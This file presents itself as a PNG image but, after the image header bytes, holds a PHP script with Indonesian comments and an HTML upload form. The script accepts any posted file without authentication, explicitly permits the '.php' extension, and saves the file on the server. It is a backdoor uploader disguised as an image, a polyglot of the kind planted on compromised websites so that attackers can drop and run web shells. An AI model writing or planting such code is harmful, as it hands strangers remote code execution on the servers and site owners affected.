‰PNG

IHDR  ô      Õæš   sRGB ®Îé    IDATx^ì½ ¼eWY6þœÞn™;%3™™´	é$„ Ò‹` B>APP)Ÿˆ€X@#¨ØåD”À 
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Menggunakan DOCUMENT_ROOT untuk menentukan path
    $target_dir =  "/home//"; // Sesuaikan jika perlu
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;

    // Mendapatkan ekstensi file
    $fileExtension = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // Cek jika file sudah ada
    if (file_exists($target_file)) {
        echo "Maaf, file sudah ada.<br>";
        $uploadOk = 0;
    }

    // Izinkan format file tertentu, termasuk PHP
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'php'];
    if (!in_array($fileExtension, $allowedExtensions)) {
        echo "Maaf, hanya file JPG, JPEG, PNG, GIF & PHP yang diizinkan.<br>";
        $uploadOk = 0;
    }

    // Cek apakah $uploadOk sudah diset ke 0 oleh salah satu error
    if ($uploadOk == 0) {
        echo "Maaf, file tidak dapat diupload.<br>";
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " telah diupload.<br>";
        } else {
            echo "Maaf, terjadi kesalahan saat mengupload file.<br>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Form Upload</title>
</head>
<body>
    <h2>Form Upload</h2>
    <form action="" method="post" enctype="multipart/form-data">
        Pilih file untuk diupload:
        <input type="file" name="fileToUpload" id="fileToUpload" required>
        <input type="submit" value="Upload" name="submit">
    </form>
</body>
</html>